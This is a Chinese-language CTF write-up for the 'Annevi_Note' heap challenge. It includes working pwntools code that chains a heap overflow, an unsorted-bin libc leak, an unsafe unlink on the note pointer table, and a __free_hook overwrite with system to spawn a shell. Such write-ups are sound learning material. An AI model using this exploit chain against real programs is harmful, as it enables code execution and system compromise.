# Annevi_Note

## 题目简述

便签的 `edit` 固定读取 256 字节，而可申请的堆块小于该长度，形成堆溢出。利用路线是：先从 unsorted bin 泄露 libc，再在相邻块中伪造满足检查的空闲块触发 unsafe unlink，把便签指针表改造成任意地址写，最后覆盖 `__free_hook` 为 `system`。

## 解题过程

先申请四个 `0x90` 大小的便签，最后一个写入 `/bin/sh`。释放并重新申请第 0 块后，使用 `show(0)` 读取未被完全覆盖的 unsorted-bin 指针：

```python
add(0x90, b"A")
add(0x90, b"B")
add(0x90, b"C")
add(0x90, b"/bin/sh\x00")

delete(0)
add(0x90, b"")
show(0)

io.recvuntil(b"content:")
leak = u64(io.recvn(6).ljust(8, b"\x00"))
libc.address = leak - (libc.sym["__malloc_hook"] + 0x68)
```

上式中的 `0x68` 对应题目所用 glibc 2.23 的 `main_arena+88` 与 `__malloc_hook` 之差；换 libc 时必须重新确认，不能机械照搬。

程序的指针表保存的是用户区地址，也就是正常 chunk header 后的 `chunk+0x10`。为了让 unlink 检查看到“某个已知位置指向伪 chunk 头”，把伪 chunk 直接放在用户数据开头。指针表相关地址为 `0x602048`：

```python
add(0x300, b"D")

fake = flat(
    0, 0x91,
    0x602048 - 0x18,          # fd
    0x602048 - 0x10,          # bk
    b"\x00" * 0x70,
    0x90, 0xa0,
)
edit(1, fake)
delete(2)                     # 触发 unlink
```

伪造的 `fd`、`bk` 满足：

```text
FD->bk == P
BK->fd == P
```

unlink 的双向链表写操作随后把便签指针改到指针表自身附近。借助这个新指向，先把某个表项替换成 `__free_hook`，再通过普通编辑功能写入 `system`：

```python
edit(1, b"\x00" * 0x18 + p64(libc.sym["__free_hook"]))
edit(1, p64(libc.sym["system"]))
delete(3)                     # free("/bin/sh") -> system("/bin/sh")
io.interactive()
```

## 方法总结

- 核心链路：堆溢出伪造空闲块、unsafe unlink 改写指针表、任意写覆盖 `__free_hook`。
- 关键细节：程序保存的是 `chunk+0x10`，所以伪 chunk 的摆放位置必须与指针表语义对应；`fd` 和 `bk` 还要通过完整性检查。
- 复用要点：unsorted-bin 泄露偏移与 hook 是否存在都依赖 libc 版本，复现前应先确认题目动态库和保护条件。
